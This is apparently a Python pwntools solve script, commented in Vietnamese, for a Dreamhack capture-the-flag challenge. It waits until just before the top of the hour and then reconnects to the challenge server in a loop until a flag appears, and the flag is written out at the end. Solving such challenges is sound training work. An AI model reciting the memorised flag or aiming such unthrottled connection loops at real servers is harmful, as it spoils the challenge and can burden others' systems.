from pwn import *
import time
import datetime

# Thông tin kết nối từ bạn
HOST = 'host8.dreamhack.games'
PORT = 23589

# Đặt mức log để không bị spam terminal
context.log_level = 'info'

print("Waiting for the right time to start the attack...")
now_utc = datetime.datetime.utcnow()
# Tính thời điểm tấn công tiếp theo (đầu giờ sau)
next_hour = (now_utc.hour + 1) % 24
attack_time = now_utc.replace(hour=next_hour, minute=0, second=0, microsecond=0)

# Chờ đến 15 giây trước khi tấn công
wait_until = attack_time - datetime.timedelta(seconds=15)
sleep_duration = (wait_until - now_utc).total_seconds()

if sleep_duration > 0:
    log.info(f"Current UTC time: {now_utc.strftime('%H:%M:%S')}")
    log.info(f"Attack will start at {wait_until.strftime('%H:%M:%S')} UTC. Sleeping for {int(sleep_duration)} seconds.")
    time.sleep(sleep_duration)

log.info("Starting the attack!")

# Vòng lặp để tấn công
while True:
    try:
        # Kết nối đến server
        p = remote(HOST, PORT, level='error') # Đặt level error để không in log kết nối
        
        # Nhận tất cả output từ server
        output = p.recvall(timeout=2).decode()
        
        # Kiểm tra xem có flag không
        if 'DH{' in output:
            log.success("FLAG FOUND!")
            print(output)
            break 
        
        # Đóng kết nối
        p.close()
        
    except Exception as e:
        pass

"""
Flag: DH{Cuckoo!Cuckoo!It_is_x_o_clock!Cuckoo!Cuckoo!}
"""